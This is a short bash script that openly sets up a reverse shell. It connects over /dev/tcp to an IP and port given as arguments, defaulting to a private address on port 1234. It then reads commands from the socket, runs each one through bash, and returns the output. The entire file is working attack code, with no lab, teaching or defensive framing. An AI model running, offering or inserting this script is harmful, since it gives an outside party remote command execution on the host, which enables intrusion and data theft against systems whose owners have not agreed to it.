#!/bin/bash

# Assign IP and port from script arguments, default values if not provided
IP=${1:-"192.168.15.198"}
PORT=${2:-"1234"}

# Inform the user about the target IP and port for the socket connection
echo "Attempting to create a reverse shell connection to IP: $IP and Port: $PORT"

# Using /dev/tcp to create a network connection
# Redirecting standard input, output, and error to the connection
# Executing commands received over the connection
{ 
    if exec 3<>/dev/tcp/$IP/$PORT; then
        echo "Reverse shell connected successfully. Awaiting commands..."
        while read -r cmd <&3; do
            echo "Executing command: $cmd"
            if output=$(bash -c "$cmd" 2>&1); then
                echo "Command output: $output"
                echo -e "$output\n" >&3
            else
                echo "Failed to execute command: $cmd"
            fi
        done
    else
        echo "Failed to create a reverse shell connection."
    fi
} 2>/dev/null

# Close the connection
exec 3<&-
exec 3>&-

echo "Reverse shell connection closed."
